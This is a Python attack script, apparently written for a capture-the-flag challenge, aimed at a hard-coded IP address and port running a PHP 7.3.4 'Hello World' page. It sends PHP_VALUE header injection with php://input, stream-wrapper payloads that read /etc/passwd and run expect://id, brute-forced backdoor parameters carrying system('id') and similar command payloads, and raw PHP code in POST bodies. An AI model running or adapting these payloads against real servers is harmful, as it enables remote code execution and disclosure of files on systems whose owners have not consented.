#!/usr/bin/env python3
"""
PHP 7.3.4 specific vulnerability testing
"""
import requests
import socket
import ssl

target_host = "61.147.171.35"
target_port = 51810
target_url = f"http://{target_host}:{target_port}"

def test_http_methods():
    """Test various HTTP methods"""
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
    
    for method in methods:
        try:
            r = requests.request(method, f"{target_url}/", timeout=5)
            print(f"[{method}] Status: {r.status_code}, Length: {len(r.text)}")
            if r.text and r.text != "Hello World!\n":
                print(f"   Content: {r.text[:100]}")
        except Exception as e:
            print(f"[{method}] Error: {e}")

def test_raw_request():
    """Send raw HTTP request to bypass any filtering"""
    # Test with raw socket
    raw_requests = [
        # Normal request
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\n",
        # Request with special headers
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nX-Forwarded-Host: localhost\r\n\r\n",
        # HTTP/0.9 request (no headers)
        b"GET /\r\n",
        # Request with PHP_VALUE
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nPHP_VALUE: auto_prepend_file=php://input\r\n\r\n<?php phpinfo(); ?>",
    ]
    
    for i, raw_req in enumerate(raw_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_host, target_port))
            sock.send(raw_req)
            response = sock.recv(4096)
            sock.close()
            print(f"\n[Raw Request {i}]")
            print(f"Request: {raw_req[:50]}...")
            print(f"Response: {response[:200]}")
        except Exception as e:
            print(f"[Raw Request {i}] Error: {e}")

def test_php_wrapper():
    """Test PHP stream wrappers via different methods"""
    wrappers = [
        "php://input",
        "php://stdin",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
        "expect://id",
        "phar://test.phar",
    ]
    
    for wrapper in wrappers:
        # Try as different parameters
        for param in ['file', 'page', 'include', 'path', 'template', 'doc']:
            url = f"{target_url}/?{param}={wrapper}"
            try:
                r = requests.get(url, timeout=5)
                if r.text != "Hello World!\n" and len(r.text) > 13:
                    print(f"[INTERESTING] {param}={wrapper}: {r.text[:100]}")
            except:
                pass

def test_backdoor_params():
    """Test common backdoor parameter names"""
    params = []
    
    # Single letter params
    for c in 'abcdefghijklmnopqrstuvwxyz':
        params.append(c)
    
    # Common names
    params.extend([
        'cmd', 'exec', 'command', 'execute', 'ping', 'query', 'jump', 'code',
        'reg', 'do', 'func', 'arg', 'option', 'load', 'process', 'step',
        'read', 'feature', 'imp', 'view', 'content', 'mod', 'con', 'url',
        'req', 'request', 'out', 'log', 'debug', 'pwd', 'die', 'dir', 'search',
        'class', 'include', 'file', 'path', 'doc', 'document', 'folder', 'root',
        '_', '__', '___', 'zzz', 'abc', 'aaa', 'test', 'payload', 'shell',
        'fun', 'function', 'call', 'callback', 'invoke', 'act', 'action',
        # PHP specific
        'phpinfo', 'system', 'passthru', 'eval', 'assert', 'preg_replace',
        'create_function', 'include_once', 'require', 'require_once'
    ])
    
    payloads = ['id', 'phpinfo()', 'system("id")', '1', 'test', '../etc/passwd']
    
    for param in params:
        for payload in payloads:
            url = f"{target_url}/?{param}={payload}"
            try:
                r = requests.get(url, timeout=2)
                if r.text != "Hello World!\n" and "Hello World" not in r.text:
                    print(f"[FOUND] {param}={payload}: {r.text[:100]}")
                    return
            except:
                pass
    
    print("No backdoor params found")

def test_post_backdoor():
    """Test backdoor via POST"""
    params = ['cmd', 'c', 'exec', 'code', 'shell', 'x', 'e', 'a', 's', '1', '0', '_']
    
    for param in params:
        data = {param: 'id'}
        try:
            r = requests.post(target_url, data=data, timeout=2)
            if r.text != "Hello World!\n" and "Hello World" not in r.text:
                print(f"[POST FOUND] {param}: {r.text[:100]}")
        except:
            pass
    
    # Test with raw PHP code in body
    r = requests.post(target_url, data="<?php system('id'); ?>", 
                     headers={'Content-Type': 'application/x-httpd-php'}, timeout=2)
    if r.text != "Hello World!\n":
        print(f"[RAW PHP] {r.text[:100]}")

if __name__ == "__main__":
    print("=" * 50)
    print("Testing HTTP Methods")
    print("=" * 50)
    test_http_methods()
    
    print("\n" + "=" * 50)
    print("Testing Raw Requests")
    print("=" * 50)
    test_raw_request()
    
    print("\n" + "=" * 50)
    print("Testing PHP Wrappers")
    print("=" * 50)
    test_php_wrapper()
    
    print("\n" + "=" * 50)
    print("Testing Backdoor Parameters")
    print("=" * 50)
    test_backdoor_params()
    
    print("\n" + "=" * 50)
    print("Testing POST Backdoor")
    print("=" * 50)
    test_post_backdoor()
